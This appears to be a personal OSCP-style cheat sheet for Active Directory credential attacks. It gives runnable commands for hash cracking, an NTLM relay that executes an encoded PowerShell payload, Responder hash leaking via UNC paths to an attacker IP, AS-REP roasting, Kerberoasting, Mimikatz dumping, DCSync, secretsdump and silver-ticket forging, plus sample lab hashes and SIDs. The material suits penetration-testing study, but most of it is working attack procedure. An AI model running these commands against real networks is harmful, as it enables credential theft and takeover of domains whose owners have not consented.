
## Get&Crack hashes

### NTLM (=rc4_hmac)

```bash
hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt --force

john hash -w=/usr/share/wordlists/rockyou.txt
```
>[!info] 
>https://ntlm.pw/

### Net-NTLMv2

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force

john hash -w=/usr/share/wordlists/rockyou.txt
```

Relay attack:
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
>[!info]
>Other commands than reverse shells possible (e.g. DB enumeration [link](https://arz101.medium.com/vulnlab-reflection-42d86fcee222))

**Leak hashes:**

Start responder:
```bash
sudo responder -I tun0 -A # analyze mode
```

Use one of the following commands to leak NTLM hashes to responder:
```bash
SMB: \\<Kali-IP>\test
MSSQL: xp_dirtree \\<Kali-IP>\test

Website: (SSRF & RFI & LFI)
\\<Kali-IP>\test
//<Kali-IP>/test
http://<Kali-IP>/test
```

### Other

AS-REP roasting:
```bash
# On Kali
impacket-GetNPUsers -dc-ip <IP> -outputfile hash -request <domain>/<user>

# User list but no creds?
impacket-GetNPUsers <domain>/ -usersfile users.txt  -dc-ip <IP> -request

# On Windows
.\Rubeus.exe asreproast /nowrap
```
>[!Reminder]
>No creds no problem!

```bash
# Crack the hash
sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force

john hash -w=/usr/share/wordlists/rockyou.txt
```

Kerberoasting:
```bash
# On Kali
impacket-GetUserSPNs -request -dc-ip <IP> <domain>/<user>

# On Windows
.\Rubeus.exe kerberoast /outfile:hash
```

```bash
# Crack the hash
sudo hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

sudo hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force

john hash -w=/usr/share/wordlists/rockyou.txt
```

### Post compromise

Mimikatz:
```bash
mimikatz.exe
privilege::debug
token::elevate

sekurlsa::logonpasswords
lsadump::sam
lsadump::sam /inject
lsadump::lsa /inject
sekurlsa::tickets /export
# Use ticket to access webserver: iwr -UseDefaultCredentials http://web04

# DCSync
lsadump::dcsync /user:<domain>\Administrator # dcsync attack
lsadump::dcsync /user:Administrator
```

Windows Credential Guard:
- **Potentially out of scope for OSCP**
```bash
mimikatz.exe
privilege::debug
token::elevate

sekurlsa::logonpasswords # Locate encrypted blob

misc::memssp # Wait for authentication

# Check log file
type C:\Windows\System32\mimilsa.log
```

Secretsdump:
```bash
sudo impacket-secretsdump <domain>/<USER>:<PASS>@<IP>

# Dump NTDS.dit
sudo impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-hashes
```
>[!info]
>**RUN SECRETSDUMP WITH SUDO !!!**

laZagne:
```bash
.\laZagne.exe all
```

DCSync
```bash
# On Windows using Mimikatz
.\mimikatz.exe
token::elevate
privilege::debug
lsadump::dcsync /user:<domain>\Administrator

# On Kali using secretsdump
impacket-secretsdump -just-dc-user <USER> <domain>/Administrator:"<PASS>"@<IP>
```

**Windows privilege escalation and enumeration:**
- [[Windows]]

---


## Silver ticket attack

Requires:
- Domain SID
- User NTLM hash (Plaintext password can be converted to NTLM hash: [link](https://codebeautify.org/ntlm-hash-generator))
- User SPN (e.g. **svc_mssql**)

Examples:
- SQL: [link](https://medium.com/@The_Hiker/breach-vulnlab-walkthrough-thehiker-86dcab8b619f)
- Web: [link](https://arz101.medium.com/vulnlab-lustrous-12e94513dbdf)

**On Kali**
```bash
# Grab domain SID:
impacket-lookupsid <domain>/<user>:<pass>@<IP>

# Impersonate administrator
impacket-ticketer -nthash '<NTLM>' -domain-sid '<domain-SID>' -domain <domain> -spn '<SPN>' -user-id 500 Administrator
# Get the -spn output from impacket-GetUserSPNs under "ServicePrincipleName"

# Export the ticket
export KRB5CCNAME=Administrator.ccache

# Modify hosts file
cat /etc/hosts
<IP> <domain>

# Use the ticket to access the MSSQL server (use domain specified in impacket-ticketer request)
impacket-mssqlclient -k -no-pass <domain> -windows-auth
impacket-mssqlclient -k -no-pass <username>@<domain>
impacket-mssqlclient -k <domain> # Same domain as used in impacket-ticketer
```

Perform secretsdump using the ticket:
```bash
impacket-secretsdump -k <domain> -just-dc-user Administrator
```
>[!info]
>Make sure to use the FQDN that was used to create the ticket


**On Windows**

Retrieve SPN password hash using Mimikatz: (thanks to iis_service session)
```
privilege::debug
sekurlsa::logonpasswords
```
>[!info]
>`4d28cf5252d39971419580a51484ca09`

Obtain the Domain SID (works since current user is in same domain):
```
whoami /user
```
>[!info]
>`S1-5-21-1987370270-658905905-1781884369` (remove last 4 digits)

Obtain Silver ticket:
```
kerberos::golden /sid:<domain-sid> /domain:<domain> /ptt /target:web04.corp.com /service:http /rc4:<NTLM> /user:jeffadmin
```
>[!info]
>Target is FQDN

Access webpage on the WEB04 machine:
```
iwr -UseDefaultCredentials http://web04
```

Perform secretsdump using the ticket:
```bash
impacket-secretsdump -k <domain> -just-dc-user Administrator
```
>[!info]
>Make sure to use the FQDN that was used to create the ticket

---


## Decode SecureString object:

https://stackoverflow.com/questions/49437141/converting-securestring-stored-in-text-file-back-to-readable-string
```bash
echo "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" > pass.txt

$password = Get-Content pass.txt | ConvertTo-SecureString 

$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password) 

$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr) 

$UnsecurePassword

hHO_S9gff7ehXw
```
- Example: [[nara]]

Alternative solution:
```powershell
$user = "Administrator"  
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367" | ConvertTo-SecureString  
cred = New-Object System.Management.Automation.PSCredential($user, $pass)  
$cred.GetNetworkCredential() | Format-List
```